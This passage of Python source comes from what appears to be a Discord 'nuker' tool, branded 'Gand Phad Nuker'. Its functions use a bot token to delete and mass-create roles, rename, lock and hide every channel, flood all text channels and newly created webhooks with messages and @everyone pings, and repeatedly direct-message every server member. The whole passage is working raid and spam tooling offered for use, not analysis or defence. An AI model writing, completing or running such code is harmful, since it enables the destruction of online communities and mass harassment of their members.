        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error unbanning user {user_id}: {e}")

async def riyu_create_roles(session,role_name):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{server_id}/roles', headers=headers, json={'name': role_name}) as r:
                if r.status == 429:
                    print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Created Role to {server_id} - {role_name}")
                        break
                    else:
                        break
        except:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't Create Role to {server_id}")
            pass

async def get_roles():
   
    roleIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{server_id}/roles", headers=headers) as r:
       
             m = await r.json()
             for role in m:
                roleIDS.append(role["id"])
            
    except TypeError:
        print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Dead....")
         
    return roleIDS

async def riyu_delete_role(session, role_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/guilds/{server_id}/roles/{role_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Deleted Role {role_id}.")
                        break
                    else:
                        break
        except:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't Delete Role {role_id}")

async def riyu_rename_role(session, new_name, role_id):
    url = f'https://discord.com/api/v9/guilds/{server_id}/roles/{role_id}'
    headers = {'Authorization': f'Bot {bot_token}'}
    data = {
        'name': new_name
    }
    try:
        async with session.patch(url, headers=headers, json=data) as response:
            if response.status == 429:
                print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
            else:
                if response.status == 200:
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Renamed Role {role_id} to {new_name}.")
                else:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't rename role {role_id}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error renaming role {role_id}: {e}")

async def rename_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid Guild ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server not found.")
        return

    new_name = await asyncio.to_thread(input,f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} NAME {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")

    try:
        rename_tasks = []

        for channel in guild.channels:
            rename_tasks.append(rename_channel(channel, new_name))

        await asyncio.gather(*rename_tasks)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}All channels renamed successfully.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to rename channels. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to rename channels due to HTTPException: {e}")

async def rename_channel(channel, new_name):
    try:
        await channel.edit(name=new_name, reason="Gand Phad Nuker | Wriyansh™")
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel {channel.id} renamed to {new_name}.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to rename channel {channel.name}. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to rename channel {channel.name} due to HTTPException: {e}")


async def lock_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server Not Found.")
        return

    try:
        lock_tasks = []
        total_channels = len(guild.channels)
        success_count = 0

        for channel in guild.channels:
            lock_tasks.append(lock_channel(channel))

        results = await asyncio.gather(*lock_tasks, return_exceptions=True)

        for result in results:
            if result is True:  # Successful lock returns True
                success_count += 1
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully locked {success_count}/{total_channels} channels.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to lock channels. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to lock channels due to HTTPException: {e}")

async def lock_channel(channel):
    try:
        overwrite = channel.overwrites_for(channel.guild.default_role)
        overwrite.send_messages = False
        await channel.set_permissions(channel.guild.default_role, overwrite=overwrite)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel {channel.id} locked.")
        return True
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to lock channel {channel.name}. Missing permissions.")
        return False
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to lock channel {channel.name} due to HTTPException: {e}")
        return False


async def unlock_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server Not Found.")
        return

    try:
        unlock_tasks = []
        total_channels = len(guild.channels)
        success_count = 0

        for channel in guild.channels:
            unlock_tasks.append(unlock_channel(channel))

        results = await asyncio.gather(*unlock_tasks, return_exceptions=True)

        for result in results:
            if result is True:  # Successful unlock returns True
                success_count += 1

        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully unlocked {success_count}/{total_channels} channels.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to unlock channels. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to unlock channels due to HTTPException: {e}")

async def unlock_channel(channel):
    try:
        overwrite = channel.overwrites_for(channel.guild.default_role)
        overwrite.send_messages = None
        await channel.set_permissions(channel.guild.default_role, overwrite=overwrite)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel {channel.id} unlocked.")
        return True
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to unlock channel {channel.name}. Missing permissions.")
        return False
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to unlock channel {channel.name} due to HTTPException: {e}")
        return False


async def hide_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server Not Found.")
        return

    try:
        hide_tasks = []
        total_channels = len(guild.channels)
        success_count = 0

        for channel in guild.channels:
            hide_tasks.append(hide_channel(channel))

        results = await asyncio.gather(*hide_tasks, return_exceptions=True)

        for result in results:
            if result is True:  # Successful hide returns True
                success_count += 1
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully hidden {success_count}/{total_channels} channels.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to hide channels. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to hide channels due to HTTPException: {e}")

async def hide_channel(channel):
    try:
        overwrite = channel.overwrites_for(channel.guild.default_role)
        overwrite.view_channel = False
        await channel.set_permissions(channel.guild.default_role, overwrite=overwrite)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel {channel.id} hidden.")
        return True
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to hide channel {channel.name}. Missing permissions.")
        return False
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to hide channel {channel.name} due to HTTPException: {e}")
        return False


async def unhide_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server Not Found.")
        return

    try:
        unhide_tasks = []
        total_channels = len(guild.channels)
        success_count = 0

        for channel in guild.channels:
            unhide_tasks.append(unhide_channel(channel))

        results = await asyncio.gather(*unhide_tasks, return_exceptions=True)

        for result in results:
            if result is True:  # Successful unhide returns True
                success_count += 1
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully unhidden {success_count}/{total_channels} channels.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to unhide channels. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to unhide channels due to HTTPException: {e}")

async def unhide_channel(channel):
    try:
        overwrite = channel.overwrites_for(channel.guild.default_role)
        overwrite.view_channel = None
        await channel.set_permissions(channel.guild.default_role, overwrite=overwrite)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel {channel.id} unhidden.")
        return True
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to unhide channel {channel.name}. Missing permissions.")
        return False
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to unhide channel {channel.name} due to HTTPException: {e}")
        return False



async def spam_all_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server Not Found.")
            return

        
        content = await asyncio.to_thread(input, f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} CONTENT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")
        try:
            amount = int(await asyncio.to_thread(input, f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} AMOUNT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}"))
        except ValueError:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid number entered for amount.")
            return

        if amount <= 0:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Please enter a number greater than 0 for amount.")
            return


        tasks = []
        

        for channel in guild.text_channels:
    
            tasks.extend([channel.send(content) for _ in range(amount)])

        
        await asyncio.gather(*tasks)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully spammed {amount} messages in all text channels.")
    except discord.LoginFailure:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid bot token.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}The bot lacks permissions to send messages in the channels.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error: {e}")




async def spam_in_channel(channel, content, amount):
    """Send the message multiple times in a specific channel."""
    try:
        for _ in range(amount):
            await channel.send(content)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Sent message to {channel.name}: {content}")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Missing permissions to send messages in {channel.name}.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error sending message to {channel.name}: {e}")



async def spam_webhooks(guild):
    try:
        webhook_config = config.WEBHOOK

        webhooks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_name = webhook_config["name"]
                webhook = await channel.create_webhook(name=webhook_name)
                print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Webhook Created for {channel.name}.")
                webhooks.append(webhook)

        num_messages = int(input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} AMOUNT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}"))

        message_content = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} CONTENT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")

        include_everyone = False
        if message_content.lower() == 'embed':
            include_everyone_input = input((f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} EVERYONE Y/N {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")).lower()
            include_everyone = include_everyone_input == 'yes'
        start_time_spam = time.time()
        tasks = [
            send_embed_webhook(webhook, num_messages, message_content, include_everyone)
            if message_content.lower() == 'embed'
            else send_regular_webhook(webhook, num_messages, message_content)
            for webhook in webhooks
        ]
        await asyncio.gather(*tasks)
        end_time_target_spam = time.time()

        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Spam - {num_messages} messages sent via webhooks.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error: {e}")

async def send_embed_webhook(webhook, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            await send_embed_webhook_message(webhook, include_everyone)
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Can't send messages via Webhook {webhook.name}: {e}")

async def send_embed_webhook_message(webhook, include_everyone):
    try:
        embed_config = config.EMBED

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await webhook.send(content=message, embed=embed)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Embed Sent via Webhook {webhook.name}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Can't send embed via Webhook {webhook.name}: {e}")

async def send_regular_webhook(webhook, num_messages, message_content):
    try:
        for _ in range(num_messages):
            await webhook.send(content=message_content)
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Message Sent via Webhook {webhook.name}: {message_content}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Can't send messages via Webhook {webhook.name}: {e}")

async def webhook_spam(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            await spam_webhooks(guild)
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error: {e}")
        
async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} AMOUNT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}"))

            if num_messages > 20:
                num_messages = 20
            message_content = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} CONTENT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")

            members_sent = 0
            members_fail = 0

            start_time_total = time.time()

            # Collect all non-bot members
            members = [member for member in guild.members if not member.bot]

            async def send_message(member):
                nonlocal members_sent, members_fail
                try:
                    start_time_member = time.time()
                    for _ in range(num_messages):
                        await member.send(message_content)
                    end_time_member = time.time()
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Message Sent to {member.name} ({member.id}).")
                    members_sent += 1
                except Exception as e:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Can't send message to {member.name}: {e}.")
                    members_fail += 1

            # Use asyncio.gather for concurrent message sending
            await asyncio.gather(*(send_message(member) for member in members))

            end_time_total = time.time()
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}DM All - {members_sent} messages sent, {members_fail} messages failed.")
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")

    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error: {e}.")


async def create_roles(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid Guild ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")
        return

    try:
        num_roles = int(await asyncio.to_thread(input, f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} AMOUNT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}"))
    except ValueError:
        print(f"            [{Fore.RED}-{Fore.RESET}]Invalid number. Please enter a numeric value.")
        return

    base_name = await asyncio.to_thread(input, "            Role name ~ ")

    role_creation_tasks = []
    for _ in range(num_roles):
        random_color = Colour(random.randint(0, 0xFFFFFF))  # Generate a random color
        role_creation_tasks.append(guild.create_role(name=base_name, color=random_color))

    created_roles = []
    try:
        created_roles = await asyncio.gather(*role_creation_tasks, return_exceptions=True)
